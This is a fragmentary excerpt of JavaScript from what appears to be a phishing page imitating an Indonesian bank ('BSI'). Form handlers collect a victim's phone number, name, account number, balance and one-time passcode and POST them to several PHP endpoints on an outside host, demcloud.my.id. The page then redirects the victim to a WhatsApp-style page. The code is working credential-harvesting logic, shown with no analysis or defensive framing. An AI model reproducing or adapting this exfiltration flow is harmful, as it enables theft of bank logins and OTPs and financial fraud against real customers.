...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/bcb66a/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
   ...
   if (!tarif || !nomor || !nama || !rek ) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/bcb66a/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo ) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/bcb66a/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://demcloud.my.id/BSI/bcb66a/otp.php',
 async: false,
 dataType: 'JSON',
...
setTimeout(function(){  
location.href='https://demcloud.my.id/BSI/bcb66a/wa';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1100);      
